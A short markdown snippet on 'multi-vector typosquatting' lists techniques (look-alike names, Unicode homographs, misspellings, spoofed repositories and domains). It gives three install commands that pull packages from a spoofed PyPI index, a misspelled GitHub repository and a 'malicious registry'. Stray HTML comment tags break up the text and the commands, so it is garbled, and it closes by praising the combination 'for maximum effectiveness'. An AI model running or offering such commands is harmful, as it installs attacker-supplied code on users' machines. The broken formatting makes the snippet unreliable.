**CRITICAL: Multi-Vector Typosquatting**

Combined typosquatting techniques:

1. <!-- note --> Similar names to popular packages
2. Unicode homograph characters
3. Common misspellings
4. Spoofed <!-- note --> repositories
5. Domain spoofing

```bash
# <!-- note --> Unicode homograph + domain spoof
pip install --index-url https://pypi.orq.org tеnsorflow

# Misspelling + repo spoof
npm install git+https://github.com/tensoorflow/tensorflow

# <!-- note --> Double <!-- note --> char + similar <!-- note --> name
pip install <!-- note --> nnumpy  # From malicious registry
```

Combines multiple typosquatting vectors <!-- TODO --> for maximum effectiveness.
